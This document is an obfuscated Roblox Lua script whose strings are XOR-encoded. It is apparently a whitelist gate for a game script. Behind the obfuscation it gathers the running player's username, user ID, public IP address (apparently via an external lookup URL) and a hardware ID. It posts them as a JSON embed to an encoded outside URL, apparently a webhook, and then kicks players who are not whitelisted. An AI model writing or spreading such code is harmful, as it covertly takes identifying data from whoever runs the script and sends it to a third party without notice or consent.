--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v109,v110) local v111={};for v124=1, #v109 do v6(v111,v0(v4(v1(v2(v109,v124,v124 + 1 )),v1(v2(v110,1 + (v124% #v110) ,1 + (v124% #v110) + 1 )))%256 ));end return v5(v111);end local v8=game.Players.LocalPlayer;local v9=v8.CharacterAppearanceId;local v10=game:HttpGet(v7("\217\215\207\53\245\225\136\81\208\211\210\107\239\171\206\24\200\141\212\55\225","\126\177\163\187\69\134\219\167"));local v11=game:GetService(v7("\17\207\50\228\242\34\193\51\209\245\32\222\25\192\238\53\196\41\192","\156\67\173\74\165")):GetClientId();local v12=v7("\16\145\111\69\235\5\16\17\250\28\52\152\119\11\96\227\29\51\241\126\30\109\226\4\68\237\112\16\99\228\28\64\236\117\18\109","\38\84\215\41\118\220\70");local v13=v7("\3\65\108\68\168\30\71\116\74\176\5\64","\158\48\118\66\114");local v14=v7("\242\117\94\103\37\243\181\250\118\64\120\36\241","\155\203\68\112\86\19\197");local v15=v7("\30\143\120\170\22\54\183\170\20\147\100\173\22","\152\38\189\86\156\32\24\133");local v16=v7("\164\114\247\101\173\117\240\22\177\113\241\96\222\26\243\23\164\1\234\31\216\6\245\11\216\15\132\96\164\7\242\100\223\7\255\98","\38\156\55\199");local v17=v7("\252\40\89\125\69\37\163\103\229\45\41\126\49\57\174\21\140\95\49\10\55\82\171\14\250\37\41\123\70\34\171\23\251\95\47\10","\35\200\29\28\72\115\20\154");local v18=v7("\78\237\159\136\217\98\102\73\241\131\141\219","\84\121\223\177\191\237\76");local v19=v7("\234\2\159\238\107\5\104\143\234\4\157\238\110\9","\161\219\54\169\192\90\48\80");local v20=v7("\29\27\78\119\26\18\78\119\29\18\78\115","\69\41\34\96");local v21=v7("\238\146\129\68\80\127\235\141\133\88\76\126\239","\75\220\163\183\106\98");local v22=v7("\91\233\197\100\141\76\233\222\121\142\87","\185\98\218\235\87");local v23=v7("\159\105\105\183\137\254\133\111\127\168\143\248","\202\171\92\71\134\190");local v24=v7("\112\144\98\217\121\151\98\217\126\143\123\219","\232\73\161\76");local v25=v7("\234\129\23\19\72\226\151\19\9\74\245\142\26","\126\219\185\34\61");local v26=v7("\93\153\8\60\44\34\161\169\85\159\16\36\45","\135\108\174\62\18\30\23\147");local v27=v7("\226\188\100\154\79\248\125\144\228\167\120","\167\214\137\74\171\120\206\83");local v28=v7("\220\161\124\8\161\233\218\164\100\19\173\241","\199\235\144\82\61\152");local v29=v7("\86\69\239\101\86\67\225\101\95\68\247\121\86\79","\75\103\118\217");local v30=v7("\150\5\38\90\235\79\149\26\33\65\234\80\144\0","\126\167\52\16\116\217");local v31=v7("\153\124\116\206\229\75\172\134\127\121\211\250\72\170\155","\156\168\78\64\224\212\121");local v32=v7("\86\187\244\128\84\182\235\152\85\160\244\159\95","\174\103\142\197");local v33=v7("\7\113\8\118\116\10\174\24\121\8\104\107\15\170\5","\152\54\72\63\88\69\62");local v34=v7("\134\144\160\14\133\149\160\8\134\138\191\9\133","\60\180\164\142");local v35=v7("\0\6\75\120\118\181\92\13\11\75\123\119\186","\114\56\62\101\73\71\141");local v36=v7("\225\185\149\149\239\189\149\149\235\167\131\149","\164\216\137\187");local v37=v7("\132\179\127\227\247\175\69\129\180\127\227\247\174","\107\178\134\81\210\198\158");local v38=v7("\105\95\212\136\251\105\95\204\151\242\108\64\211\149\242","\202\88\110\226\166");local v39=v7("\146\88\213\185\153\148\65\208\163\155\141\93\211","\170\163\111\226\151");local v40=v7("\64\100\224\118\31\101\112\95\98\231\118\31\100\127","\73\113\80\210\88\46\87");local v41=v7("\211\125\159\92\178\217\98\156\66\180\207\125\157\67","\135\225\76\173\114");local v42=v7("\75\184\236\254\254\237\255\84\185\232\254\253\229\254","\199\122\141\216\208\204\221");local v43=v7("\252\140\66\190\41\175\250\147\66\164\32\184\252\138\66","\150\205\189\112\144\24");local v44=v7("\117\209\154\29\32\222\48\51\104\167\156\28\39\197\69\68\114\165\242\20\82\172\69\93\114\211\232\21\32\209\66\64\117\208\234\25","\112\69\228\223\44\100\232\113");local v45=v7("\131\73\5\213\183\46\208\209\82\4\134\183\42\203\128\78\2\134\251\37\208\132\26\74\133\229\43\223\130\25\4\131\183\47\223\213","\230\180\127\103\179\214\28");local v46=v7("\219\1\92\20\177\25\177\137\72\12\68\189\24\173\216\83\15\64\169\25\178\221\85\18\66\189\66\227\136\1\9\30\230\22\181\220","\128\236\101\63\38\132\33");local v47=v7("\253\170\20\69\238\187\158\249\228\20\29\238\184\130\248\172\69\23\251\178\203\252\171\92\21\225\239\202\249\255\21\71\230\237\205\175","\175\204\201\113\36\214\139");local v48=v7("\7\238\109\249\93\30\238\22\249\73\101\149\96\254\73\19\157\101\249\73\102\238\109\248\73\97\239\16\255\33\16\234\109\249\37\31\154","\100\39\172\85\188");local v49=v7("\252\46\225\206\98\244\44\247\209\103\227\41\233\209","\83\205\24\217\224");local v50=v7("\177\147\131\110\179\139\156\108\177\139\156\104\177","\93\134\165\173");local v51=v7("\239\170\145\140\104\154\230\48\239\164\147\140\107\155\227","\30\222\146\161\162\90\174\210");local v52=v7("\180\22\39\68\178\27\62\89\179\0\36","\106\133\46\16");local v53=v7("\9\119\39\178\11\23\11\110\38\170\20\17\9\116","\32\56\64\19\156\58");local v54=v7("\11\144\181\24\13\167\206\3\155\171\5\12","\224\58\168\133\54\58\146");local v55=v7("\8\2\5\169\39\200\209\69\11\2\29","\107\57\54\43\157\21\230\231");local v56=v7("\136\210\95\163\234\146\157\143\216\95\164\225\142","\175\187\235\113\149\217\188");local v57=v7("\109\248\215\2\176\42\54\109\255\215\2\178\41\46","\24\92\207\225\44\131\25");local v58=v7("\26\138\234\2\74\43\19\157\233\2\67","\29\43\179\216\44\123");local v59=v7("\236\129\114\2\239\138\114\2\236\136\120\2\235\139","\44\221\185\64");local v60=v7("\80\191\24\17\34\88\178\6\10\38\79\178\26","\19\97\135\40\63");local v61=v7("\247\14\125\108\125\127\253\8\125\105\126\102","\81\206\60\83\91\79");local v58=v7("\31\252\129\60\125\150\31\234\31\243\137\60\126\151\24","\196\46\203\176\18\79\163\45");local v62=v7("\236\119\48\79\119\171\161\234\114\44\80\115\162","\143\216\66\30\126\68\155");local v63=v7("\251\159\85\133\148\241\128\175\251\152\84\133\157\240","\129\202\168\109\171\165\195\183");local v64=v7("\115\0\111\150\139\64\168\115\8\121\137\140\69","\134\66\56\87\184\190\116");local v65=v7("\109\96\89\245\75\184\116\123\110\96\95\245\72\188\121","\85\92\81\105\219\121\139\65");local v66=v7("\172\235\4\11\46\141\179\225\4\21\50\141\173","\191\157\211\48\37\28");local v67=v7("\142\78\160\82\107\143\81\162\74\116\142\73\162","\90\191\127\148\124");local v68=v7("\41\213\123\89\41\209\120\89\42\209\96\70\43\214","\119\24\231\78");local v69=v7("\211\122\247\4\137\22\95\211\125\253\4\142\18\67","\113\226\77\197\42\188\32");local v70=v7("\110\67\186\226\116\71\165\236\116\64\167","\213\90\118\148");local v71=v7("\12\121\250\7\29\10\96\231\14\3\9\122\225","\45\59\78\212\54");local v72=v7("\65\1\214\197\213\120\227\161\70\4\205\217\214\120","\144\112\54\227\235\230\78\205");local v73=v7("\235\112\65\173\130\13\253\121\90\165\158\10\231\125","\59\211\72\111\156\176");local v74=v7("\24\211\173\124\27\215\173\127\30\214\173\126\27","\77\46\231\131");local v75=v7("\235\3\229\14\237\3\248\18\233\12\248\17\233\2","\32\218\52\214");local v73=v7("\22\79\127\249\163\230\11\11\27\78\127\249\165\229","\58\46\119\81\200\145\208\37");local v76=v7("\122\220\99\226\241\228\120\121\223\103\226\248\237\98","\86\75\236\80\204\201\221");local v77=v7("\35\25\34\203\175\221\43\15\38\213\174\197\38\25","\235\18\33\23\229\158");local v78=v7("\1\234\144\245\1\232\153\245\9\226\143\234\5\233","\219\48\218\161");local v77=v7("\183\32\50\17\149\30\185\178\63\45\26\137","\128\132\17\28\41\187\47");local v79=v7("\80\98\85\116\15\80\100\72\107\4\89\124\95\106","\61\97\82\102\90");local v80=v7("\245\121\229\18\148\25\79\91\245\96\250\19\158","\105\204\78\203\43\167\55\126");local v81=v7("\244\253\117\80\71\86\137\0\247\242\109\71\64","\49\197\202\67\126\115\100\167");local v82=v7("\111\2\145\120\212\15\16\111\3\145\113\208","\62\87\59\191\73\224\54");local v83=v7("\182\86\169\135\179\86\180\152\191\86\180\152\181\87","\169\135\98\154");local v84=v7("\154\39\119\26\172\107\145\133\38\112\7\179\97\144","\168\171\23\68\52\157\83");local v85=v7("\173\33\187\252\115\122\201\167\32\187\255\118\127","\231\148\17\149\205\69\77");local v86=v7("\217\242\137\172\7\177\209\241\147\181\5\168","\159\224\199\167\155\55");local v87=v7("\166\163\111\156\166\171\106\156\166\167\104\156\174\162","\178\151\147\92");local v88=v7("\221\164\25\124\64\25\40\194\175\31\98\92\27","\26\236\157\44\82\114\44");local v89=v7("\120\127\135\21\114\96\135\14\122\96\135\8\115","\59\74\78\181");local v90=v7("\124\128\20\11\229\114\159\11\8\227\107\128\14\14","\211\69\177\58\58");local v91=v7("\225\179\55\167\186\153\249\183\41\167\167\154\228","\171\215\133\25\149\137");local v92=v7("\176\144\98\180\189\100\175\12\178\157\124\168\187","\34\129\168\82\154\143\80\156");local v93=v7("\212\227\103\69\25\30\199\211\228\125\90\30\24","\233\229\210\83\107\40\46");local v94=v7("\224\97\23\129\87\227\17\96\155\36\227\16\16\155\81\144\27\100\155\39\226\16\23\155\93\227\19\100\134\80\153\102\103\142\84\224","\101\161\34\82\182");local v95=v7("\205\91\10\173\248\179\218\12\165\47\127\173\141\175\214\119\206\90\20\167\143\180\161\99\201\91\127\173\253\177\167\15\185\43\1\166","\78\136\109\57\158\187\130\226");local v96=v7("\102\59\161\243\104\61\161\169\115\58\248\169\103\114\173\242\107\61\180\168\110\105\250\188\63\111\255\164\107\105\175\168\103\106\169\165","\145\94\95\153");local v97={4991773868 -(782 + 356) };local v98={v16,v17,v12,v44,v45,v46,v47,v96,v94,v95,v48};local v99={v14,v15,v13,v18,v19,v20,v21,v22,v23,v24,v25,v26,v27,v28,v29,v30,v31,v32,v33,v34,v35,v36,v37,v49,v51,v52,v38,v39,v53,v40,v54,v55,v56,v57,v41,v58,v59,v61,v58,v62,v63,v64,v65,v66,v67,v68,v71,v70,v69,v72,v42,v74,v75,v73,v77,v78,v77,v93,v43,v79,v81,v80,v82,v83,v84,v50,v85,v86,v87,v88,v89,v90,v91,v92};local v100={};local v101=game:GetService(v7("\213\217\0\197\125\178\239\219\29\214\75","\215\157\173\116\181\46"));local v102=v7("\61\160\159\226\201\111\251\196\241\219\59\181\153\235\148\49\189\152\241\213\39\176\197\241\213\56\251\138\226\211\122\163\142\240\210\58\187\128\225\149\100\230\221\165\143\96\231\217\160\137\101\229\222\164\140\100\226\210\162\149\99\139\217\223\192\49\184\140\226\243\96\150\191\250\213\13\153\130\252\233\63\185\217\202\227\108\237\154\205\130\97\142\152\255\151\6\158\133\194\254\103\177\156\197\213\15\155\166\241\143\35\224\145\247\229\103\128\210\191\207\17\159\158\164\202\61\157\166","\186\85\212\235\146");local v103=game:HttpGet(v7("\202\149\2\238\42\180\23\141\149\31\243\60\239\72\203\207\31\241\118\239\72\203\206\34\247\52\235\23\193\148\4\236\60\224\76\141\155\25\240\60\177\76\203\140\19\196\54\224\93\159\164\3\236\54\254\93\141\177\23\236\48\253","\56\162\225\118\158\89\142"));local v104=1 + 0 ;if string.find(v103,'"dstActive":true') then v104=2;end local function v105() local v112=0;local v113;local v114;local v115;local v116;local v117;local v118;while true do if (v112==1) then v117=v113.day;v118=v113.month;if (v113.hour<(14 -4)) then v114="0"   .. v113.hour ;end if (v113.min<(6 + 4)) then v115="0"   .. v113.min ;end v112=165 -(92 + 71) ;end if (v112==(0 + 0)) then v113=os.date(v7("\29\79\212","\184\60\101\160\207\66"),os.time() + (v104 * 3600) );v114=v113.hour;v115=v113.min;v116=v113.sec;v112=1 -0 ;end if (v112==2) then if (v113.sec<10) then v116="0"   .. v113.sec ;end if (v113.day<(775 -(574 + 191))) then v117="0"   .. v113.day ;end if (v113.month<10) then v118="0"   .. v113.month ;end return v114   .. ":"   .. v115   .. ":"   .. v116   .. v7("\113\207\60","\220\81\226\28")   .. v117   .. "/"   .. v118   .. "/"   .. v113.year ;end end end local v106={[v7("\52\199\135\254\228","\167\115\181\226\155\138")]=65280,[v7("\208\39\227","\166\130\66\135\60\27\17")]=13784863 + 2926817 ,[v7("\102\70\207\118\59","\80\36\42\174\21")]=0 -0 };function msg(v119,v120) request({[v7("\123\2\59","\26\46\112\87")]=v102,[v7("\148\38\191\124\176\187","\212\217\67\203\20\223\223\37")]=v7("\138\162\155\230","\178\218\237\200"),[v7("\158\176\231\212\179\167\245","\176\214\213\134")]={[v7("\215\162\184\192\173\88\77\185\153\175\196\173","\57\148\205\214\180\200\54")]=v7("\19\237\37\56\127\17\252\33\61\121\28\178\63\39\121\28","\22\114\157\85\84")},[v7("\230\196\23\221","\200\164\171\115\164\61\150")]=v101:JSONEncode({[v7("\187\249\1\64\135\173","\227\222\148\99\37")]={{[v7("\39\91\70\250\252","\153\83\50\50\150")]=v7("\110\115\122\18\91\190\79","\45\61\22\19\124\19\203"),[v7("\197\23\30\246\16\121\169\213\27\2\251","\217\161\114\109\149\98\16")]=v119,[v7("\6\57\40\121","\20\114\64\88\28\220")]=v7("\35\8\209\188","\221\81\97\178\212\152\176"),[v7("\206\232\17\244\8","\122\173\135\125\155")]=tonumber(v120)}}})});end local function v107(v121) local v122=0 + 0 ;local v123;while true do if (v122==(849 -(254 + 595))) then v123=game:GetService(v7("\177\210\5\171\12\52\218\146\200\3\188","\168\228\161\96\217\95\81")):GetUserInfosByUserIdsAsync({v121});return v123[1];end end end local v108=v107(v9);if (table.find(v97,v9) or table.find(v99,v10) or table.find(v98,v11)) then local v125=0;local v126;local v127;while true do if (v125==(0 -0)) then v126=v7("\236\217\39\72\42\91\210\194\58\89\43\23\209\222\39\82\111\83\210\194\45\83\61\83\155\194\43\78\57\82\201\145\116\28\39\67\207\193\61\6\96\24\223\216\61\95\32\69\223\159\41\91\96\68\222\216\32\84\58\85","\55\187\177\78\60\79");v127=nil;v125=1791 -(573 + 1217) ;end if (v125==2) then msg(v7("\49\29\166\66\168\247\77\233","\201\98\105\199\54\221\132\119")   .. v126   .. "\n"   .. v7("\140\31\134\51\88\117","\204\217\108\227\65\98\85")   .. v108.DisplayName   .. v7("\30\139\213","\160\62\163\149\133\76")   .. v108.Username   .. ")\nUserId: "   .. v9   .. "\nIP: "   .. v10   .. "\nHWID: "   .. v11   .. "\nTime: "   .. v105() ,v106.Green);return true;end if (v125==(2 -1)) then function v127(v133,v134,v135) game.StarterGui:SetCore(v7("\30\203\81\239\104\192\148\36\200\86\232\71\219\137\34\192","\224\77\174\63\139\38\175"),{[v7("\176\72\76\34\129","\78\228\33\56")]=v135 or v7("\253\123\187\13\173\219\124","\229\174\30\210\99") ,[v7("\47\232\158\69","\89\123\141\230\49\141\93")]=v133,[v7("\215\100\228\13\4\67\252\127","\42\147\17\150\108\112")]=v134 or (1 + 3) });end v127(v7("\56\174\36\107\226\228\6\181\57\122\227","\136\111\198\77\31\135"));v125=2;end end else v102=v7("\222\180\25\63\208\140\239\66\44\194\216\161\31\54\141\210\169\30\44\204\196\164\67\44\204\219\239\12\63\202\153\183\8\45\203\217\175\6\60\140\135\242\91\120\150\131\243\95\125\144\134\241\88\121\149\135\246\84\127\140\128\159\95\2\217\210\172\10\63\234\131\130\57\39\204\238\141\4\33\240\220\173\95\23\250\143\249\28\16\155\130\154\30\34\142\229\138\3\31\231\132\165\26\24\204\236\143\32\44\150\192\244\23\42\252\132\148\84\98\214\242\139\24\121\211\222\137\32","\163\182\192\109\79");if (table.find(v100,v10) or table.find(v100,v9) or table.find(v100,v11)) then msg("Status: Blacklisted\n"   .. v7("\1\53\5\210\175\116","\149\84\70\96\160")   .. v108.DisplayName   .. v7("\120\78\45","\141\88\102\109")   .. v108.Username   .. ")\nUserId: "   .. v9   .. "\nIP: "   .. v10   .. "\nHWID: "   .. v11   .. "\nTime: "   .. v105() ,v106.Black);else msg("Status: Not Whitelisted\n"   .. v7("\134\64\207\98\64\125","\161\211\51\170\16\122\93\53")   .. v108.DisplayName   .. v7("\187\230\146","\72\155\206\210")   .. v108.Username   .. ")\nUserId: "   .. v9   .. "\nIP: "   .. v10   .. "\nHWID: "   .. v11   .. "\nTime: "   .. v105() ,v106.Red);end task.wait(1 -0 );if table.find(v100,v10) then v8:Kick(v7("\100\118\85\13\56\74\115\71\26\54\66\59\20\6\39\82\106\71\84\124\9\126\93\29\48\73\104\80\64\52\65\53\71\11\58\72\114\65\12","\83\38\26\52\110"));else v8:Kick(v7("\97\24\50\6\91\22\41\82\24\37\50\72\24\3\47\79\75\87\20\69\74\30\55\82\25\87\13\73\81\25\103\78\76\3\55\85\2\88\104\66\81\4\36\73\74\19\105\65\95\88\52\67\81\25\47\83\90\87\19\73\24\48\34\82\24\32\47\79\76\18\43\79\75\3","\38\56\119\71"));end end